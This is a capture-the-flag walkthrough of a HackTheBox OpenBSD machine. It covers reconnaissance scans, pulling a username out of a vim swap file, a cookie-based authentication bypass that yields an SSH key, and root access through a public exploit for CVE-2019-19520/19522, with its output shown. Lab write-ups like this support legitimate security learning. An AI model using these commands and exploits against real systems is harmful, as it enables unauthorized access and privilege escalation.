---
title: "HackTheBox: EasyKeyS Walkthrough WriteUp"
layout: default
published: true
---

Let's have a look on what it is, by throwing the IP in browser and we are greeted with a login page. And in the background we run NMAP scan and gobuster to gather some info about the target. The NMAP scan gave us some useful information,
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDe8l1l+kUpCKDTLXtOj9CY1xcde98zhpP0ANXSj7eI2KRVQuOpowxjzNf/NrDoIffaCtsNY36nnVw5JDbX2zU0+wKeMEoVHBlelNSneBHrYv4CuhlO7ll6tHZcs0kWSvFk8nipNTYXSm48EhFbspsC89Yv7REeRFq+uE1unEo8d+Dt2MmDzNnu+QtATp4wlSE1LIROq7cDRsR10S5j6fnaRbEYGquXSJkW6sV6PTZhGm8y6sXXQ3RynYJ129m5YTevg4fKpF/FkfEuPn5sRIj+aZCT6GjP9WEae+R/6lVEcMOmuq9K9CCqoGuwGakoK+m/upQDlI7pXcN8359a7XcMXSgriJIjV8yv350JsdLqIN704w5NLowAaInYPqXKNrXdxa5olprzF1dMlN0ClvV96tX9bg2ERrRhrLbSOZudrqefMNjSKqdNWLh7AQh8TnwdDMdXf/IOat1CjQMNwPTi3XkklU+Lm92J8Nd6gO8uLd6HuRLPVxUqJp6hKwLIbHM=
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOM044THRHSb9MKRgg+pCGqLErFIOMaaGjCwwSpxVFsdQWW9kg3fROwqwtNVM1McgJ4Y4NwVzl+w5DZGK2OdhNE=
|   256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKuJoZTZonWY0/JkBfYeM2POVzE/TZfUJGA10PMXB1s
80/tcp open  http    syn-ack ttl 63 OpenBSD httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
```
We know that it's a OPENBSD system, so we look for OPENBSD Authentication Bypass, and after spending some time on google, we found this - [https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt?_ga=2.58244398.587934852.1575530822-682141427.1570559125](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt?_ga=2.58244398.587934852.1575530822-682141427.1570559125). <br>

Going through the documentation, we got that it's vulnerable to specific kind of username - `-schallenge` and this will help in bypassing authentication, but it give the following message, 
```
OpenSSH key not found for user -schallenge
```
So we need to find out what the username is! Let's see what we have from gobuster,
```
cardinal@zero:~/CTF/htb/EasyKeyS$ gobuster dir -u http://10.10.10.199 -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -x php
===============================================================                        
Gobuster v3.0.1                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                        
===============================================================                        
[+] Url:            http://10.10.10.199                                                
[+] Threads:        10                                                                 
[+] Wordlist:       /home/cardinal/Tools/SecLists/Discovery/Web-Content/common.txt     
[+] Status codes:   200,204,301,302,307,401,403                                        
[+] User Agent:     gobuster/3.0.1                                                     
[+] Extensions:     php                                                                
[+] Timeout:        10s                                                                
===============================================================                        
2020/08/14 16:09:50 Starting gobuster                                                  
===============================================================                        
/css (Status: 301)                                                                     
/fonts (Status: 301)                                                                   
/images (Status: 301)                                                                  
/includes (Status: 301)                                                                
/index.php (Status: 200)                                                               
/index.php (Status: 200)                                                               
/index.html (Status: 200)                                                              
/js (Status: 301)                                                                      
/vendor (Status: 301)                                                                  
===============================================================                        
2020/08/14 16:15:50 Finished                                                           
===============================================================
```
There are a few intersting directories that we can look into, the one intersts me the most is `includes` and it contains two files,
```
Index of /includes/

../                                                23-Jun-2020 08:18                   -
auth.php                                           22-Jun-2020 13:24                1373
auth.php.swp                                       17-Jun-2020 14:57               12288
```

`auth.php` doesnot contain much information but `auth.php.swp` seems to contain information that we might need. But the file doesnot seem to open using vim or cat, but the `file` command says it's a `vim swap file` so let's google and see how we can access files with `.swp` extention. 
<br><br>One way to do it is using,
```shell
$ vim -r auth.php.swp
```
This seems to provide us with the PHP code for the authentication process. But when we do `cat` of the file, we see some information that might be intersting for us. So, upon googling a bit more, I found out the we can use `strings` to get the information. Which just worked perfectly.
```
b0VIM 8.                                                           
jennifer
openkeys.htb
/var/www/htdocs/includes/auth.php                                                                                                                                             
3210                                                                                                                                                                          
#"!                                                                                                                                                                           
    session_start();
    session_destroy();
    session_unset();
function close_session()
    $_SESSION["username"] = $_REQUEST['username'];
...
```

Now we seem to have quite a few things for us, we have a username - `jennifer`. 


Now we have a username and we can carry on with our exploitation.<br><br> We have a PHPSESSIONID, and we saw that is a user is authenticated and there are a few things that get into session variable and one of which was 
```
...
 49     $_SESSION["username"] = $_REQUEST['username'];
...
```
so we add an extra cookie as `username` along side the PHPSESSID,
```
Cookie: PHPSESSID=7v7l79tccam4tpq8mi9j3od7kf; username: jennifer
``` 
and we have a OpenSSH key with us. Change the permission of the SSH key and use it to get access to `jennifer`'s account.

```shell
$ ssh -i jennifer-key-id jennifer@openkeys.htb
```
In the user's directory we find the user flag and now we have to esclate to root, to grab the root flag.
We have to refer to the above documentation for how to escalte priveledges. And it contains specific details for doing so.

Firstly we, look if we have `xlock` or not, as it is the vulnerable component that will help us to get to root. And we have it.

But the method doesnot seem to work! So, we have to look for another way to exploit this. Let's do some more searching - we find an exploit which look useful and we shall try that - [https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot)
The above one is just compilationof all the code from [POC](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt?_ga=2.58244398.587934852.1575530822-682141427.1570559125) and running it. Which worked perfectly and gave the following output
```
openkeys$ nano openbsd-authroot
openkeys$ chmod +x openbsd-authroot                  
openkeys$ ./openbsd-authroot                         
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
```

We got the password, and putting that password in `S/Key Password`, we become root and We Pwned the box!
